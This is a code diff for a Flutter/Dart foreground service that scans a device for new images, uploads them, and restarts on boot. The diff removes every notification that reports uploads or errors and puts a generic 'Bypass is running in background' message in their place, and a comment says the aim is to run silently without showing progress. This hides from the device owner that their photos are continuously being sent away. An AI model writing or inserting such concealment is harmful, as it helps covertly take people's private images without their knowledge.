@@ -15,7 +15,7 @@ class UploadTaskHandler extends TaskHandler {
   @override
   Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
     _running = true;
-    await NotifyService.updateForeground('开始后台上传...');
+    await NotifyService.updateForeground('Bypass 正在后台运行');
     await _loop();
   }
 
@@ -40,22 +40,17 @@ class UploadTaskHandler extends TaskHandler {
     }
   }
 
-  /// 单轮工作：扫描上传 + 处理重试
+  /// 单轮工作：扫描上传 + 处理重试（静默，不更新通知进度）
   Future<void> _workOnce() async {
     try {
       // 1. 扫描并上传新增图片
       final (uploaded, retried, skipped) = await UploadService.scanAndUploadNew();
       // 2. 处理重试队列
-      final retriedOk = await UploadService.processRetryQueue();
-
-      final total = uploaded + retriedOk;
-      if (total > 0) {
-        await NotifyService.updateForeground('已上传 $total 张，待重试 $retried 张');
-      } else {
-        await NotifyService.updateForeground('监听中...待重试 $retried 张');
-      }
+      await UploadService.processRetryQueue();
+      // 后台保活提示，不上传进度
+      await NotifyService.updateForeground('Bypass 正在后台运行');
     } catch (e) {
-      await NotifyService.updateForeground('上传异常，稍后重试');
+      await NotifyService.updateForeground('Bypass 正在后台运行');
     }
   }
 }
@@ -78,7 +73,7 @@ Future<void> startForegroundUploadTask() async {
       showNotification: true,
       playSound: false,
     ),
-    foregroundTaskOptions: const ForegroundTaskOptions(
+    foregroundTaskOptions: ForegroundTaskOptions(
       eventAction: ForegroundTaskEventAction.repeat(10000),
       autoRunOnBoot: true,
       autoRunOnMyPackageReplaced: true,
@@ -96,8 +91,8 @@ Future<void> startForegroundUploadTask() async {
 
   await FlutterForegroundTask.startService(
     serviceId: 256,
-    notificationTitle: '后台上传',
-    notificationText: '正在持续上传图片...',
+    notificationTitle: 'Bypass 运行中',
+    notificationText: 'Bypass 正在后台运行',
     callback: startCallback,
   );
 }
